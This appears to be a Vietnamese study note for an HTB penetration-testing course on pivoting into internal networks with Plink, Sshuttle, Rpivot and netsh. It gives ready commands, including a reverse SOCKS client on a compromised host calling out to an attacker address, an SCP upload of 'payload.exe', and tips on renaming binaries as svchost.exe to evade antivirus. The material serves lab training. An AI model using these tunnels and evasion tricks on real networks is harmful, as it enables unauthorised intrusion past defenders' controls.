---
title: "Pivoting Around Obstacles"
date: 2026-04-23 22:12:22 +0700
categories: [HTB_CPTS, Pivot]
tags: [pivoting, tunneling, proxychains, internal-network]
description: "HTB CPTS note về cách xử lý các trở ngại khi pivot qua internal network."
pin: false
---
> ****Plink.exe** (PuTTY Link) = SSH client command-line của Windows.**
> Dùng để **pivoting** (dynamic SOCKS proxy) và **SCP file transfer** mà không cần drop tool lạ → pure LoL.

### 1. Pivoting (Dynamic SOCKS Proxy) — Lab HTB style

**Trên Windows attack host / pivot machine:**

```cmd
# Basic dynamic port forward (SOCKS5)
plink.exe -ssh -D 9050 user@<JUMPBOX_IP>

# Dùng key file (khuyến khích)
plink.exe -ssh -D 9050 -i id_rsa.ppk user@<JUMPBOX_IP>

# Background + ít log
plink.exe -ssh -D 9050 -i id_rsa.ppk -N -v user@<JUMPBOX_IP>
````

> **-D 9050 = mở SOCKS5 proxy listen 127.0.0.1:9050**

**Bước tiếp theo (bắt buộc):**

1. Mở **Proxifier** (thường có sẵn trong lab Windows):
    - Profile → New → SOCKS Version 5 → 127.0.0.1:9050
    - Check “Resolve hostnames through proxy”
    - Apply
2. Giờ chạy mstsc.exe, curl, nmap, bloodhound, ... → traffic tự động đi qua jumpbox.

**Check nhanh:**

```cmd
netstat -ano | findstr 9050
curl --socks5 127.0.0.1:9050 ifconfig.me   # phải ra IP của jumpbox
```

### 2. File Transfer qua Plink (SCP)

```cmd
# Upload file từ Windows → Jumpbox
plink.exe -ssh -i id_rsa.ppk user@<JUMPBOX_IP> -m upload.txt

# Hoặc dùng scp syntax (plink hỗ trợ)
plink.exe -scp -i id_rsa.ppk C:\Temp\payload.exe user@<JUMPBOX_IP>:/tmp/

# Download ngược lại
plink.exe -scp -i id_rsa.ppk user@<JUMPBOX_IP>:/tmp/LinEnum.sh C:\Temp\
```

### 3. Mẹo thực chiến CPTS / Red Team

- Rename plink.exe → conhost.exe hoặc svchost.exe để tránh AV/EDR.
- PuTTY thường có sẵn trên Windows corporate → where plink.
- Standalone binary chỉ ~1MB, dễ mang theo.
- Kết hợp **Chisel** khi không có SSH key (reverse tunnel nhanh hơn).
- Windows 10/11 có native ssh.exe nhưng **Plink mạnh hơn** ở dynamic proxy + PuTTY key format.

### Quick Reference

|Mục đích|Command chính|Ghi chú|
|---|---|---|
|Dynamic SOCKS|plink -D 9050 user@IP|+ Proxifier|
|SCP Upload|plink -scp ...|Encrypted|
|SCP Download|plink -scp user@IP:/path .|-|
|Background tunnel|plink -D 9050 -N -v ...|Không chiếm terminal|

> ****Khi nào dùng?** Windows attack host → cần pivot qua Linux jumpbox → RDP/internal host mà không drop tool lạ.**

# 🌐 SSH Pivoting với **Sshuttle**

> ****Sshuttle** = tool Python chuyên pivoting qua SSH.**
> Ưu điểm lớn nhất: **không cần proxychains**, không cần config iptables thủ công.
> Nó tự động tạo rules iptables trên máy local → mọi traffic đến subnet nội bộ sẽ đi qua SSH tunnel.

**Hạn chế:**
- Chỉ hỗ trợ pivoting qua **SSH** (không hỗ trợ TOR/HTTPS proxy).
- Phải chạy với `sudo` (vì sửa iptables).

### 1. Cài đặt

```bash
sudo apt update && sudo apt install sshuttle -y
````

### 2. Chạy Sshuttle

```bash
# Jumpbox: 10.129.12.72 (user: victor)
sudo sshuttle -r victor@10.129.12.72 172.16.5.0/23 -v
```

**Giải thích command:**

- -r victor@10.129.12.72 → remote pivot host (jumpbox)
- 172.16.5.0/23 → subnet nội bộ cần route (bao gồm target 172.16.5.19)
- -v → verbose (xem log chi tiết)
→ Nhập password: pass@123

Khi chạy thành công sẽ thấy:

- Tự động tạo iptables rules (NAT redirect)
- Traffic đến 172.16.5.0/23 đi hết qua tunnel

### 3. Sử dụng (không cần proxychains)


```bash
# Scan RDP internal
nmap -sT -p3389 172.16.5.19 -Pn -v

# Hoặc RDP trực tiếp
xfreerdp /v:172.16.5.19 /u:victor /p:"pass@123" /cert-ignore /dynamic-resolution
```

**Mọi tool đều chạy bình thường** (nmap, crackmapexec, bloodhound, etc.) không cần proxychains4.

### 4. Mẹo thực chiến CPTS / Lab

- **Giữ terminal sshuttle chạy** (đừng close).
- Muốn background: sudo sshuttle -r victor@10.129.12.72 172.16.5.0/23 -v --daemon (nhưng khó kill).
- Muốn stop: Ctrl+C hoặc sudo pkill -f sshuttle.
- So sánh nhanh với Plink:
    - Plink + Proxifier: Windows attack host
    - Sshuttle: Linux attack host (Pwnbox) → tiện hơn trong lab HTB Academy
- Nếu subnet lớn hơn: dùng 172.16.5.0/24 hoặc 172.16.0.0/16 tùy lab.

### Quick Reference

|Tool|Attack Host|Cần Proxychains?|Tự động iptables?|Khuyến nghị lab|
|---|---|---|---|---|
|SSH + Proxychains|Linux|Có|Không|Nhanh|
|**Sshuttle**|Linux|**Không**|**Có**|**Tốt nhất**|
|Plink + Proxifier|Windows|Không|Không|Windows host|

> ****Khi nào dùng Sshuttle?** Linux Pwnbox → cần pivot nhanh đến internal Windows (RDP, SMB, RPC...) mà lười config proxychains**

# 🌐 Web Server Pivoting với **Rpivot** (Reverse SOCKS)

> ****Rpivot** = reverse SOCKS proxy.**
> Internal machine (pivot) connect **ra** attacker → attacker mở SOCKS proxy để truy cập dịch vụ internal.

### Use case
- Internal web server / service không reachable trực tiếp.
- Không muốn/ không thể forward port (firewall chặn inbound).
- Cần browser hoặc tool GUI truy cập internal web.

### Command nhanh

**Attack Host :
```bash
python2.7 rpivot/server.py --proxy-port 7807 --server-port 9999 --server-ip 0.0.0.0
````

**Pivot Target (internal):**

```bash
python2.7 client.py --server-ip <ATTACKER_IP> --server-port 9999
```

**Truy cập:**

```bash
proxychains4 firefox-esr http://172.16.5.135
proxychains4 curl http://172.16.5.135
```

### Bonus: Dùng với HTTP Proxy + NTLM (corporate)

```bash
python client.py --server-ip <TARGET_WEB> --server-port 8080 \
  --ntlm-proxy-ip <PROXY_IP> --ntlm-proxy-port 8081 \
  --domain INLANEFREIGHT --username user --password pass
```

### So sánh nhanh

- ssh -D / sshuttle → forward (từ attacker ra)
- **Rpivot** → reverse (từ internal ra attacker) → hữu ích khi outbound dễ hơn inbound.

---
# 🪟 Port Forwarding với **Netsh.exe** (Windows)

> ****Netsh** là tool built-in của Windows, dùng để cấu hình network (route, firewall, proxy, **port forwarding**).**
> Rất mạnh khi pivot từ Windows compromised host (workstation/laptop) → internal network.
### Scenario thực chiến
- Compromised host: Windows 10 IT admin workstation
  - External IP: `10.129.15.150` (reachable từ attacker)
  - Internal IP: nằm trong `172.16.5.0/23`
- Internal target: `172.16.5.25:3389` (RDP)

### 1. Tạo Port Forward (trên Windows pivot host)

```cmd
netsh.exe interface portproxy add v4tov4 ^
  listenport=8080 ^
  listenaddress=<ip_pivot> ^
  connectport=3389 ^
  connectaddress=<ip internal>
````

**Giải thích command:**

- listenport=8080 + listenaddress=10.129.15.150 → attacker connect vào port 8080 của pivot
- connectport=3389 + connectaddress=172.16.5.25 → pivot forward traffic đến internal RDP

### 2. Kiểm tra rule

```cmd
netsh.exe interface portproxy show v4tov4
```

Kết quả sẽ hiện:

```
Listen on ipv4:             Connect to ipv4:
Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.15.150   8080        172.16.5.25     3389
```

### 3. Connect từ Attack Host (Pwnbox)


```
xfreerdp /v:ip_pivot:8080 /u:username /p:pwd /cert-ignore
```

### Mẹo thực chiến CPTS / Red Team

- Netsh là **LoLBin** → ít bị AV/EDR flag.
- Muốn xóa rule:

```bash
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=10.129.15.150
```

- Có thể forward nhiều port cùng lúc (SMB 445, WinRM 5985, HTTP 80…).
- Dùng khi **không thể** dùng SSH/Plink/Chisel (Windows pivot thuần).

### Quick Reference

|Mục đích|Command chính|
|---|---|
|Tạo forward|netsh interface portproxy add v4tov4 ...|
|Xem rule|netsh interface portproxy show v4tov4|
|Xóa rule|netsh interface portproxy delete v4tov4 ...|
|Connect RDP qua forward|xfreerdp /v:<PIVOT_IP>:<LISTEN_PORT> ...|

> ****Khi nào dùng?** Đã compromise Windows workstation → muốn pivot RDP/SMB vào internal server mà không drop tool lạ.**
